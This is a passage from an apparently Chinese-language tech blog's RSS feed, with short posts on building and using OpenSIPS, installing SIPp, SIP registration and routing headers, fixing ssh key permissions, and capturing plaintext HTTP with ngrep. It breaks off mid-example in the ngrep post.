&lt;li&gt;&lt;code&gt;control&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;entity&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;database&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@startuml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;participant start
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;actor a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;boundary b
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;control c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;entity d
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;database e
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;start-&amp;gt;a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;start-&amp;gt;b
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;start-&amp;gt;c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;start-&amp;gt;d
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;start-&amp;gt;e
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@enduml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/09/hvscve/2022-10-29-20-00-04.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>centos7 安装opensips</title>
      <link>https://wdd.js.org/opensips/ch3/centos-install/</link>
      <pubDate>Thu, 05 Sep 2019 12:09:35 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/centos-install/</guid>
      <description>&lt;h1 id=&#34;安装依赖&#34;&gt;安装依赖&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; yum install epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install openssl-devel mariadb-devel libmicrohttpd-devel &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libcurl-devel libconfuse-devel ncurses-devel 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;编译&#34;&gt;编译&lt;/h1&gt;
&lt;p&gt;下面的脚本，默认将opensips安装在/usr/local/etc/目录下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; cd opensips-2.4.6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 编译&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; make all -j4 include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http regex rest_client carrierroute dialplan&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; make install include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http regex rest_client carrierroute dialplan&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果想要指定安装位置，可以使用&lt;strong&gt;prefix&lt;/strong&gt;参数指定，例如指定安装在/usr/aaa目录&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; cd opensips-2.4.6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 编译&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; make all -j4 prefix&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/aaa include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http regex rest_client carrierroute dialplan&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; make install prefix&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/aaa include_modules&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql httpd db_http regex rest_client carrierroute dialplan&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>SIPp：sip压测模拟ua工具</title>
      <link>https://wdd.js.org/opensips/tools/sipp/</link>
      <pubDate>Wed, 04 Sep 2019 12:47:07 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/sipp/</guid>
      <description>&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;SIPp 3.3&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 解压&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -zxvf sipp-3.3.990.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# centos 安装依赖&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install lksctp-tools-devel libpcap-devel gcc-c++ gcc -y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ubuntu 安装以来&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install -y pkg-config dh-autoreconf ncurses-dev build-essential libssl-dev libpcap-dev libncurses5-dev libsctp-dev lksctp-tools
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./configure --with-sctp --with-pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make install
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sipp -v
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SIPp v3.4-beta1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;aka v3.3.990&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-SCTP-PCAP built Oct  &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; 2019, 20:12:17.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; This program is free software; you can redistribute it and/or
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; modify it under the terms of the GNU General Public License as
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; published by the Free Software Foundation; either version &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; of
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; the License, or &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;at your option&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; any later version.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;附件&#34;&gt;附件&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2019/gz/280451/1570361385989-dc5d2db9-e445-4e47-bc4e-98dc3e755838.gz?_lake_card=%7B%22uid%22%3A%221570361384718-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2019%2Fgz%2F280451%2F1570361385989-dc5d2db9-e445-4e47-bc4e-98dc3e755838.gz%22%2C%22name%22%3A%22sipp-3.3.990.tar.gz%22%2C%22size%22%3A422956%2C%22type%22%3A%22application%2Fx-gzip%22%2C%22ext%22%3A%22gz%22%2C%22progress%22%3A%7B%22percent%22%3A0%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%226Yf7Z%22%2C%22card%22%3A%22file%22%7D&#34;&gt;sipp-3.3.990.tar.gz&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>编译器和女朋友有什么相同之处</title>
      <link>https://wdd.js.org/posts/2019/09/myy94p/</link>
      <pubDate>Tue, 03 Sep 2019 21:12:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/09/myy94p/</guid>
      <description>&lt;p&gt;编译器面无表情的说：xxx.cfg 189行，有个地方多了个分号？&lt;/p&gt;
&lt;p&gt;但是你在在xxx.cfg的地189哼哧哼哧找了半天，满头大汗，也没发现有任何问题，这一行甚至连个分号都没有！！&lt;/p&gt;
&lt;p&gt;而实际上，这个问题并不是出在第189行，而是出在前面几行。&lt;/p&gt;
&lt;p&gt;所以说，编译器和女朋友的相同之处在于：**他们说的话，你不能全信，也不能不信。**而要从他们说的话中分析上下文，从蛛丝马迹中，寻求唯一的真相。&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips 集成 homer6</title>
      <link>https://wdd.js.org/opensips/ch5/homer6/</link>
      <pubDate>Tue, 20 Aug 2019 11:40:31 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/homer6/</guid>
      <description>&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.opensips.org/2017/03/22/capturing-beyond-sip/&#34;&gt;https://blog.opensips.org/2017/03/22/capturing-beyond-sip/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.sipcapture.org/&#34;&gt;http://www.sipcapture.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sipcapture/homer/wiki&#34;&gt;https://github.com/sipcapture/homer/wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>模块缓存策略与reload方法</title>
      <link>https://wdd.js.org/opensips/ch3/cache-reload/</link>
      <pubDate>Tue, 20 Aug 2019 09:11:21 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/cache-reload/</guid>
      <description>&lt;h1 id=&#34;常见的问题&#34;&gt;常见的问题&lt;/h1&gt;
&lt;p&gt;有时候如果你直接在数据库中改动某些值，但是opensips并没有按照预设的值去执行，那么你就要尝试使用mi命令去reload相关模块。&lt;/p&gt;
&lt;h1 id=&#34;有缓存模块&#34;&gt;有缓存模块&lt;/h1&gt;
&lt;p&gt;opensips在启动时，会将某些模块所使用的表&lt;strong&gt;一次性全部加载到数据库，状态变化时，再回写到数据库&lt;/strong&gt;。有一下模块列表：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dispather&lt;/li&gt;
&lt;li&gt;load_balancer&lt;/li&gt;
&lt;li&gt;carrierroute&lt;/li&gt;
&lt;li&gt;dialplan&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;判断一个模块是否是一次性加载到内存的，有个简便方法，看这个模块是否提供类似于 xx_reload的mi接口，有reload的mi接口，就说明这个模块是使用一次性读取，变化回写的方式读写数据库。&lt;/p&gt;
&lt;p&gt;将模块一次性加载到内存的好处时不用每次都查数据库，运行速度会大大提升。&lt;/p&gt;
&lt;p&gt;以dispather为例子，opensips在启动时会从数据库总加载一系列的目标到内存中，然后按照设定值，周期性的向目标发送options包，如果目标挂掉，三次未响应，opensips将会将该目标的状态设置为非0值，表示该地址不可用，同时将该状态回写到数据库。&lt;/p&gt;
&lt;h1 id=&#34;无缓存模块&#34;&gt;无缓存模块&lt;/h1&gt;
&lt;p&gt;无缓存的模块每次都会向数据库查询数据。常见的模块有alias_db，该模块的说明&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ALIAS_DB module can be used as an alternative for user aliases via usrloc. The main feature is that it does not store all adjacent data as for user location and always uses database for search (&lt;strong&gt;no memory caching&lt;/strong&gt;).&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ALIAS_DB一般用于呼入时接入号的查询，在多租户的情况下，如果大多数租户都是使用呼入的场景，那么ALIAS_DB模块可能会是一个性能瓶颈，建议将该模块使用一些内存数据库替代。&lt;/p&gt;
&lt;h1 id=&#34;从浏览器reload模块&#34;&gt;从浏览器reload模块&lt;/h1&gt;
&lt;p&gt;opensips在加载了httpd和mi_http模块之后，可以在opensips主机的8888端口访问到管理页面，具体地址如：&lt;!-- raw HTML omitted --&gt;http://opensips_host:8888/mi&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Jietu20190827-075246@2x.jpg&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/jpeg/280451/1566863682080-41348c89-e7fb-4c7e-92e9-e8f641460436.jpeg#align=left&amp;display=inline&amp;height=582&amp;name=Jietu20190827-075246%402x.jpg&amp;originHeight=582&amp;originWidth=2296&amp;size=121723&amp;status=done&amp;width=2296&#34;&gt;&lt;!-- raw HTML omitted --&gt;这个页面可以看到opensips所加载的模块，然后我们点击carrierroute,  可以看到该模块所支持的管理命令列表，如下图左侧列表所示，其中cr_reload_routes就是一个管理命令。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Jietu20190827-075326.jpg&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/jpeg/280451/1566863747570-a04794ae-010b-45c9-8f8d-f611f04bdd91.jpeg#align=left&amp;display=inline&amp;height=822&amp;name=Jietu20190827-075326.jpg&amp;originHeight=822&amp;originWidth=2746&amp;size=161286&amp;status=done&amp;width=2746&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我们点击cr_reload_routes连接，跳转到下图所示页面。参数可以不用填写，直接点击submit就可以。正常情况下回返回 200 : OK，就说明reload模块成功。&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP注册调研</title>
      <link>https://wdd.js.org/opensips/ch1/sip-register/</link>
      <pubDate>Mon, 19 Aug 2019 21:30:52 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-register/</guid>
      <description>&lt;pre class=&#34;mermaid&#34;&gt;sequenceDiagram
    autonumber
    participant a as 192.168.0.123:55647
    participant b as 1.2.3.4:5060
    participant c as 172.10.10.3:49543

    a-&amp;gt;&amp;gt;b: register cseq=1, callId=1
    b--&amp;gt;&amp;gt;a: 401 Unauthorized
    a-&amp;gt;&amp;gt;b: register cseq=2, callid=1
    b--&amp;gt;&amp;gt;a: 200
    a-&amp;gt;&amp;gt;b: register cseq=3, callId=1
    b--&amp;gt;&amp;gt;a: 401 Unauthorized
    a-&amp;gt;&amp;gt;b: register cseq=4, callid=1
    b--&amp;gt;&amp;gt;a: 200
    c-&amp;gt;&amp;gt;b: register cseq=5, callid=1
    b--&amp;gt;&amp;gt;c: 401 Unauthorized
    c-&amp;gt;&amp;gt;b: register cseq=6, callid=1
    b--&amp;gt;&amp;gt;c: 500 Service Unavailable
    c-&amp;gt;&amp;gt;b: register cseq=7, callid=2
    b--&amp;gt;&amp;gt;c: 401 Unauthorized
    c-&amp;gt;&amp;gt;b: register cseq=8, callid=2
    b--&amp;gt;&amp;gt;c: 200
    c-&amp;gt;&amp;gt;b: register cseq=9, callid=2
    b--&amp;gt;&amp;gt;c: 401 Unauthorized
    c-&amp;gt;&amp;gt;b: register cseq=10, callid=2
    b--&amp;gt;&amp;gt;c: 200
    c-&amp;gt;&amp;gt;b: register cseq=11, callid=2
    b--&amp;gt;&amp;gt;c: 401 Unauthorized
    c-&amp;gt;&amp;gt;b: register cseq=12, callid=2
    b--&amp;gt;&amp;gt;c: 500 Service Unavailable
    a-&amp;gt;&amp;gt;b: register cseq=13, callId=3
    b--&amp;gt;&amp;gt;a: 401 Unauthorized
    a-&amp;gt;&amp;gt;b: register cseq=14, callid=3
    b--&amp;gt;&amp;gt;a: 200
    a-&amp;gt;&amp;gt;b: register cseq=15, callId=3
    b--&amp;gt;&amp;gt;a: 401 Unauthorized
    a-&amp;gt;&amp;gt;b: register cseq=16, callid=3
    b--&amp;gt;&amp;gt;a: 200
    a-&amp;gt;&amp;gt;b: register cseq=17, callId=3
    b--&amp;gt;&amp;gt;a: 401 Unauthorized
    a-&amp;gt;&amp;gt;b: register cseq=18, callid=3
    b--&amp;gt;&amp;gt;a: 200
    a-&amp;gt;&amp;gt;b: register cseq=19, callId=3
    b--&amp;gt;&amp;gt;a: 401 Unauthorized
    a-&amp;gt;&amp;gt;b: register cseq=20, callid=3
    b--&amp;gt;&amp;gt;a: 200
&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;服务端设置的过期时间是120s&lt;/li&gt;
&lt;li&gt;客户端每隔115s注册一次, callid和之前的保持不变&lt;/li&gt;
&lt;li&gt;当网络变了之后，由于ip地址改变，客户端的在115秒注册，此时服务端还未超时，所以给客户端响应报错500&lt;/li&gt;
&lt;li&gt;客户端在等了8秒之后，等待服务端超时，然后再次注册，再次注册时，callid改变&lt;/li&gt;
&lt;li&gt;因为服务端已经超时，所以能够注册成功&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-register/2022-10-30-20-48-11.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>ssh 私钥使用失败</title>
      <link>https://wdd.js.org/posts/2019/08/vhovcg/</link>
      <pubDate>Sat, 17 Aug 2019 18:53:37 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/vhovcg/</guid>
      <description>&lt;p&gt;报错信息如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Permissions &lt;span style=&#34;color:#ae81ff&#34;&gt;0644&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mmmmm&amp;#39;&lt;/span&gt; are too open.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;It is required that your private key files are NOT accessible by others.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;This private key will be ignored.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解决方案：将你的私钥的权限改为600, 也就是说只有你自己可读可写，其他人都不能用&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;600&lt;/span&gt; 你的私钥
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>SIP路由头</title>
      <link>https://wdd.js.org/opensips/ch5/via-route/</link>
      <pubDate>Fri, 16 Aug 2019 22:00:39 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/via-route/</guid>
      <description>&lt;h1 id=&#34;两种头&#34;&gt;两种头&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;via headers &lt;strong&gt;响应按照Via字段向前走&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;route headers &lt;strong&gt;请求按照route字段向前走&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;via头&#34;&gt;Via头&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;当uac发送请求时, 每个ua都会加上自己的via头, via都的顺序很重要，每个节点都需要将自己的Via头加在最上面&lt;/li&gt;
&lt;li&gt;响应消息按照via头记录的地址返回，每次经过自己的node时候，要去掉自己的via头&lt;/li&gt;
&lt;li&gt;via用来指明消息应该按照什么&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch5/via-route/2022-12-01-21-55-41.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;route头&#34;&gt;Route头&lt;/h1&gt;
&lt;h1 id=&#34;路由模块&#34;&gt;路由模块&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;模块&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;CARRIERROUTE&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;DISPATCHER&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;DROUTING&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;LOAD_BALANCER&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>ngrep明文http抓包教程</title>
      <link>https://wdd.js.org/network/pxn896/</link>
      <pubDate>Fri, 16 Aug 2019 09:59:08 +0800</pubDate>
      <guid>https://wdd.js.org/network/pxn896/</guid>
      <description>&lt;p&gt;一般使用tcpdump抓包，然后将包文件下载到本机，用wireshark去解析过滤。&lt;/p&gt;
&lt;p&gt;但是这样会显得比较麻烦。&lt;/p&gt;
&lt;p&gt;ngrep可以直接在linux转包，明文查看http的请求和响应信息。&lt;/p&gt;
&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install ngrep &lt;span style=&#34;color:#75715e&#34;&gt;# debian&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install ngrep &lt;span style=&#34;color:#75715e&#34;&gt;# centos7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 如果centos报错没有ngrep, 那么执行下面的命令, 然后再安装&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;http抓包&#34;&gt;HTTP抓包&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;-W byline 头信息会自动换行&lt;/li&gt;
&lt;li&gt;host 192.168.60.200  是过滤规则 源ip或者目的ip是192.168.60.200&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ngrep -W byline host 192.168.60.200
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
